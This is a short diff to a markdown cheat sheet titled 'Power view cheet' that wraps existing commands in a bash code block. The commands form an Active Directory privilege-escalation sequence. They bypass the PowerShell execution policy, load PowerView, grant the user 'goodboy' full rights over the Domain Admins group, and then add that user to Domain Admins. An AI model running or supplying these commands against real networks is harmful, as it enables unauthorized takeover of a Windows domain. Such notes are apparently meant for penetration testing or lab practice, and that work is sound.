@@ -1,6 +1,8 @@
 #### Power view cheet
 -----------------------------------------------------------------------
 # Commands
+
+```bash
 >powershell -ep bypass
 
 >Import-Module .\PowerView.ps1
@@ -10,6 +12,7 @@
 >Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"
 
 >net group "domain admins" goodboy /add /domain
+```
 
 ------------------------------------------------------------------------------------------------------------
 # Import the AD module (requires RSAT or AD PowerShell tools)
